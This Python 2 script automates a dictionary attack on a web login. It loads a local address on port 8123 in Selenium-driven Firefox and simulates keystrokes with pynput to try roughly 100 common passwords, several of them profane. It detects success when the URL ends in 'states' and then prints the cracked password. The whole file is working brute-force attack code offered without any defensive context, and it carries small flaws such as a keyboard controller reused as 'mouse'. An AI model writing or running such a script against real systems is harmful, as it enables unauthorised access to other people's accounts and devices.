import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pynput.keyboard import Key, Controller

keyboard = Controller()
mouse = Controller()

pwd = ['bob', 'cat', 'password']
pwd_list = ['123456', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', '696969', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', 'pussy', '1qaz2wsx', '7777777', 'fuckyou', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', 'fuckme', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'asshole', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'fuck', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'biteme', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'password']

driver = webdriver.Firefox()

driver.get("http://192.168.0.103:8123")

for element in pwd_list:
	for char in element:
		keyboard.press(char)
		keyboard.release(char)
		time.sleep(0.12)
	keyboard.press(Key.enter)	
	keyboard.release(Key.enter)
	time.sleep(4)
	url = driver.current_url
	if(url[-6:] == "states"):
		print "We're in!" 
		print "Password: " + element
		break
	else:
		keyboard.press(Key.ctrl)
		keyboard.press('a')
		keyboard.release(Key.ctrl)
		keyboard.release('a')
		keyboard.press(Key.delete)
		keyboard.release(Key.delete)
	
